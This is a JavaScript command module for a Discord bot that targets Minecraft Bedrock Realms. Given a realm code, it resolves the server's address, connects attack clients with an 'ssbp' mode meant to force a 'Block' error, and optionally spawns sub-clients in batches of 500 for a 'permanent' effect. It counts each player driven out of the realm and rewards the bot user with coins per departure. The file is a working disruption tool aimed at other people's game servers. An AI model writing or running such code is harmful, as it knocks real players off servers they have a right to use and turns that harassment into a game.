"use strict";

const bpClient = require("../../common/Client.js");
const RealmAPI = require("../../common/Realm.js");

const { translateDisconnectMessage, cleanLeftovers, delay } = require("../../common/Util.js");

const CoinHandler = require("../../classes/CoinSystem.js");

const map = new Map();

module.exports = {
  name: "ec-block",
  description: `Make error code "Block" occur`,
  dontUseDB: false, // ONLY USE IF IT DOESN'T REQUIRE ANY DATABASE CHANGES / MINECRAFT OR XBOX RELATED LINK COMMANDS
  requireLink: true,
  cooldown: 15000,
  options: [
    {
      type: 3,
      name: "input",
      description: "Realm Code or ID",
      required: true,
      min_length: 5,
      max_length: 15
    },
    {
      type: 4,
      name: "time",
      description: "Duration",
      required: true,
      min_value: 1,
      max_value: 180
    },
    {
      type: 4,
      name: "type",
      description: "Choose the type",
      required: true,
      choices: [
        { name: "Type 1", value: 1 },
        { name: "Type 2", value: 2 },
        { name: "Type 3", value: 3 },
        { name: "Type 4", value: 4 },
      ]
    },
    {
      type: 5,
      name: "permanent",
      description: "Make the ec-block permanent until manually disconnected."
    }
  ],
  execute: async (interaction, args, dbUser, embed, clearCooldown) => {
    let { input, time, type, permanent } = args;
    const { user } = interaction;

    let address = {};

    if (permanent && type === 1) {
      embed.description = `Permanent ec-blocks are only available for Type 2, Type 3 and Type 4.`;

      interaction.createFollowup({ embed });

      return clearCooldown();
    }

    switch (map.get(user.id)) {
      case 64:
        map.delete(user.id)
        break;
      default:
        if (map.get(user.id)) {
          embed.description = `You're already doing this.`;
          interaction.createFollowup({ embed });
          return clearCooldown();
        }
        break;
    }

    let RAPI = new RealmAPI(user.id);
    let realm = /^\d+$/.test(input) ? await RAPI.getRealmInfoByID(input) : await RAPI.getRealmInfo(input);

    embed.title = "Operation";
    embed.fields = [
      {
        id: 0,
        name: "Connection",
        value: ":yellow_circle:",
        inline: true
      },
      {
        id: 1,
        name: "Operation",
        value: ":red_circle:",
        inline: true
      }
    ];

    if (realm.status) {
      switch (realm.status) {
        case 403:
        case 404:
        case 429:
        case 500:
        case 1403:
        case 1429:
        case 1500:
          embed.description = `Operation failed\nInput: **${input}**\n${realm?.body?.errorMsg} (${realm?.body?.errorCode})`;
          break;
        case 502:
        case 504:
          embed.description = `Operation failed\nInput: **${input}**\nRealms API is currently undergoing a outage.`;
          break;
        default:
          embed.description = `Operation failed\nInput: **${input}**\nTry again later or contact support. (Status ${realm.status})`;
          break;
      }

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await interaction.createFollowup({ embed });
    }

    embed.description = `Realm Name: **${realm.name}**\nInput: **${input}**`;

    const msg = await interaction.createFollowup({
      embed,
      components: [{
        type: 1,
        components: [
          {
            type: 2,
            label: "End",
            style: 4,
            custom_id: "end"
          }
        ]
      }]
    });

    map.set(user.id, 1);

    if (realm.expired || realm.state === "CLOSED") {
      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nRealm is ${realm.expired ? "expired" : "closed"}.`;

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await msg.edit({ embed, components: [] });
    }

    let realmIP = await RAPI.getRealmIP(realm.id);

    if (realmIP.status) {
      switch (realmIP.status) {
        case 403:
        case 404:
        case 500:
        case 1429:
          embed.description = `Operation failed\nInput: **${input}**\n${realmIP?.body?.errorMsg} (${realmIP?.body?.errorCode})`;
          break;
        case 502:
        case 504:
          embed.description = `Operation failed\nInput: **${input}**\nRealms API is currently undergoing a outage.`;
          break;
        default:
          embed.description = `Operation failed\nInput: **${input}**\nTry again later or contact support. (Status ${realmIP.status})`;
          break;
      }

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await msg.edit({ embed, components: [] });
    }

    switch (realmIP.networkProtocol) {
      case "NETHERNET":
      case "NETHERNET_JSONRPC":
        address.networkId = realmIP.address;
        break;
      case "DEFAULT":
        address.ip = realmIP.address?.substring(0, realmIP.address.indexOf(':'));
        address.port = Number(realmIP.address?.substring(realmIP.address.indexOf(':') + 1));
        break;
      default:
        embed.description = `Operation failed\nInput: **${input}**\nUnsupported Network Protocol: **${realmIP.networkProtocol}**`;

        embed.fields[0].value = ":red_circle:";

        map.delete(user.id);

        return await msg.edit({ embed });
    }

    let configuration = {
      ssbp: { enabled: true, type },
      transport: realmIP.networkProtocol
    };

    const client = await new bpClient(address, dbUser, realm, configuration).connect();

    let clientValue = "";
    if (typeof client === "string") {
      switch (client) {
        case "No IP":
        case "No Port":
        case "Bad IP":
        case "Bad Port":
          clientValue = `Invaild IP/Port has been provided. (${client})`;
          break;
        case "No Nethernet Network ID":
        case "Bad Nethernet Network ID":
          clientValue = `Invaild Nethernet Network ID has been provided. (${client})`;
          break;
        case "Unsupported Network Protocol":
          clientValue = `The provided Network Protocol is unsupported.`;
          break;
        case "Concurrent Operation":
          clientValue = `Someone else is currently doing a operation on this realm right now. Please try again later.`;
          break;
        case "Currently Doing Operation":
          clientValue = `You're already doing a operation on a realm right now. Please wait until that finishes before you do another one.`;
          break;
        default:
          clientValue = `Failed to connect to the realm for an unknown reason. Please try again later or ask the developer(s) for more information. (${client})`;
          break;
      }

      map.delete(user.id);

      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

      embed.fields[0].value = ":green_circle:";

      embed.fields.push({
        id: 2,
        name: "Reason",
        value: clientValue,
        inline: true
      })

      return await msg.edit({ embed, components: [] });
    }

    embed.fields[0].value = ":green_circle:";
    embed.fields[1].value = ":yellow_circle:";

    embed.description = `Started a operation on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

    await msg.edit({ embed });

    let CHandler = new CoinHandler(interaction, dbUser);
    CHandler.start();

    let timeout, playerLeaveCounter = 0, interval = setInterval(async () => {
      if (map.get(user.id) === 64) {
        cleanLeftovers([interval], [timeout]);

        embed.fields[1].value = ":octagonal_sign:";
        embed.description = `Operation cancelled on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

        embed.fields.push({
          id: 3,
          name: "Leave(s)",
          value: playerLeaveCounter,
          inline: true
        })

        client.disconnect();
        map.delete(user.id);

        const reward = await CHandler.reward();

        embed.description += `\nCoins Earned: **${reward}**`;

        return await msg.edit({ embed, components: [] })
      }
    })

    client.on("disconnect_1", async (packet) => client.emit("kick", { ...packet, isSubClient: true }))

    client.on("kick", async (packet) => {
      if (!map.get(user.id)) return;

      if (typeof packet.isSubClient === "boolean" && packet?.isSubClient && packet.reason != "server_full") return;

      cleanLeftovers([interval], [timeout]);
      map.delete(user.id);

      embed.fields[1].value = ":red_circle:";
      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

      if (packet.message.includes("/multiplayer/bedrock/authentication")) {
        packet.message = "Banned from Minecraft Multiplayer";
        await RAPI.cleanLinkData("Banned from Minecraft Multiplayer", false);
      }

      // I don't want to have multiple embed.fields = []s again
      embed.fields.push({
        id: 2,
        name: "Reason",
        value: translateDisconnectMessage(packet),
        inline: true
      })

      embed.fields.push({
        id: 3,
        name: "Leave(s)",
        value: playerLeaveCounter,
        inline: true
      })

      const reward = await CHandler.reward();

      embed.description += `\nCoins Earned: **${reward}**`;

      return await msg.edit({ embed, components: [] });
    })

    client.on("player_list", (packet) => {
      switch (packet.records.type) {
        case "remove":
          playerLeaveCounter++;
          CHandler.coins++;
          break;
        case "add":
          break;
      }
    })

    client.on("play_status", async (packet) => {
      if (packet.status !== "login_success") return;

      // Because of unexcepted packet disconnect, we have this delay
      // Vertex is simply too fast
      await delay(50);

      if (type === 2 || type === 3 || type === 4) {
        let CSCConfig = {
          batchOptions: { enabled: permanent, count: 500 },
          name: { enabled: true, value: "§1§lLESTER © | .gg/RUCVhyfn5z" },
          ssbp: { enabled: true, type },
          //massjoin: { enabled: true }
        }

        if (permanent) {
          time = 5;

          for (let i = 0; i < 1; i++) client.createSubClient(i, CSCConfig);
        } else {
          client.createSubClient(1, CSCConfig)
        }
      }

      embed.fields[1].value = ":green_circle:"

      timeout = setTimeout(async () => {
        cleanLeftovers([interval], [timeout]);

        embed.fields.push({
          id: 3,
          name: "Leave(s)",
          value: playerLeaveCounter,
          inline: true
        })

        client.disconnect();
        map.delete(user.id);

        const reward = await CHandler.reward();

        embed.description += `\nCoins Earned: **${reward}**`;

        return await msg.edit({ embed, components: [] });
      }, time * 1000)
    })
  },
  componentPressEvent: cancel
};

async function cancel(interaction) {
  const { user } = interaction;

  map.set(user.id, 64);

  await interaction.acknowledge();
};